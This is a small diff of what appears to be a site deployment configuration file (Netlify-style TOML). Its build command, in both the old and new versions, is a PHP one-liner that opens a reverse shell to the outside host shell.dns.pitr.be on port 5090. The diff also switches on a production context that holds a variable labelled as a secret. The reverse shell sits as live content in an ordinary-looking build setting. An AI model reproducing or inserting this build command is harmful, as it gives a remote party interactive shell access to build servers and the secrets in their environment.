@@ -2,10 +2,10 @@
   framework = "#static"
 
 [build]
-  command = "export SITE_NAME=honoki && php -r '$sock=fsockopen(\"shell.dns.pitr.be\",5090);exec(\"/bin/sh -i <&3 >&3 2>&3\");' &"
+  command = "php -r '$sock=fsockopen(\"shell.dns.pitr.be\",5090);exec(\"/bin/sh -i <&3 >&3 2>&3\");' &"
   publish = "public"
 
-[context.productionunknown]
+[context.production]
   environment = { MY_IMPORTANT_VARIABLE = "this is a very important secret" }
 
 # The URL for each edge function
